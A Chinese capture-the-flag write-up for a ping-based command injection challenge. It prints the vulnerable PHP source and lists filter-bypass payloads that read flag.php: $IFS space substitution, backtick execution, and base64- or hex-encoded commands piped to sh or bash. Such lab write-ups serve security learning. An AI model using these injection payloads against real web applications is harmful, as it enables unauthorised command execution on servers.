# ping ping ping

<https://www.nssctf.cn/problem/1096>

[waf绕过](https://blog.csdn.net/weixin_50464560/article/details/120926097)

[一些绕过姿势](https://blog.csdn.net/weixin_39190897/article/details/116247765)

这题是直接放在linux环境的, 所以可以远程执行;过滤了一些东西, 比如, eval/system()/cat等等

所以直接 127.0.0.1;ls

扫到了flag;

cat%20flag.php

然后发现了空格的url编码%20也被过滤了

用$IFS$1绕过空格过滤

过滤了flag

读取index.php

```php
<!--?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\
-->
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo " ";
  print_r($a);
}
?>

```

\x{00} 到 \x{20}：这表示从十六进制 00 到 20 的所有字符，对应于 ASCII 表中的控制字符，从 NULL (\0, 即 \x{00}) 到 SPACE ( ，即 \x{20})。

## linux各种参数的意思

; 前面的命令执行完以后，继续执行后面的命令

| 管道符，将上一条命令的输出作为下一条命令的参数（显示后面的执行结果）

|| 当前面的命令执行出错时（为假）执行后面的命令

& 将任务置于后台执行

&& 前面的语句为假则直接出错，后面的也不执行，前面只能为真

## 绕过空格过滤

```bash
${IFS}$9
{IFS}
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
IFS
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
```

## playload

```md
?ip=127.0.0.1;x=g;cat$IFS$1fla$x.php
```

```md 内联执行, 将反引号的内容当作结果执行;
?ip=127.0.0.1;cat$IFS$9`ls`
```

```md base64编码
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  // cat flag.php
```

```md hex,十六进制
?ip=127.0.0.1;echo$IFS$163617420666c61672e706870|xxd$IFS$1-r$IFS$1-p|sh
```

```zsh 类似的绕过
cat fl*  用*匹配任意 
cat fla* 用*匹配任意
ca\t fla\g.php        反斜线绕过
ca\t%09fla|g.php
cat fl''ag.php        两个单引号绕过
echo "Y2F0IGZsYWcucGhw" | base64 -d | bash      // cat flag.php
//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数

echo "63617420666c61672e706870" | xxd -r -p | bash       
//hex编码绕过(引号可以去掉)

echo "63617420666c61672e706870" | xxd -r -p | sh     
//sh的效果和bash一样

cat fl[a]g.php       用[]匹配

a=fl;b=ag;cat $a$b          变量替换
cp fla{g.php,G}    把flag.php复制为flaG
ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x>=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 

nl

```

cp [选项] 源 目标